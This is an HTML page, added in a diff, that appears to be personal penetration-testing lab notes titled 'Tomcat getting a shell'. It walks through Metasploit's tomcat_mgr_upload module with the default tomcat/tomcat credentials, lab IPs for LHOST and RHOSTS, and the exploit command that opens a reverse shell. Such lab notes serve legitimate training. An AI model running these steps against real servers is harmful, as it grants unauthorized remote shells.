@@ -1,0 +1,9 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4.1 Tomcat getting a shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  <script></script>
+</head>
+<body><div class="page"><h1 class="title">4.1 Tomcat getting a shell</h1><br/><br />There's a Tomcat Sever so we can enumerate user and password.<br /><br />1. Run the following command on your Kali Machine.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$msfconsole</span></div></div><br />   <br />2. In “msfconsole” run these commands.<br />    <div class="codebox"><div class="codebox">msf6&nbsp;exploit(multi/http/tomcat_mgr_upload)&nbsp;&gt;&nbsp;search&nbsp;tomcat</div></div><br />   <br />    <img src="images/588-1.png" alt="images/588-1.png" /><br />    <br />    We're going to use “exploit/multi/http/tomcat_mgr_upload”<br />   <br />    <div class="codebox"><div class="codebox">use&nbsp;18</div></div><br />   <br />    <div class="codebox"><div class="codebox">msf6&nbsp;exploit(multi/http/tomcat_mgr_upload)&nbsp;&gt;&nbsp;<br />set&nbsp;HttpUsername&nbsp;tomcat<br />set&nbsp;HttpPassword&nbsp;tomcat<br />set&nbsp;LHOST&nbsp;192.168.12.10<br />set&nbsp;RHOSTS&nbsp;192.168.12.27<br />set&nbsp;RPORT&nbsp;8080<br />show&nbsp;options</div></div><br />   <br />    <img src="images/588-2.png" alt="images/588-2.png" /><br /><br />    <div class="codebox"><div class="codebox">msf6&nbsp;exploit(multi/http/tomcat_mgr_upload)&nbsp;&gt;&nbsp;exploit</div></div><br /><br />    <img src="images/588-3.png" alt="images/588-3.png" /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
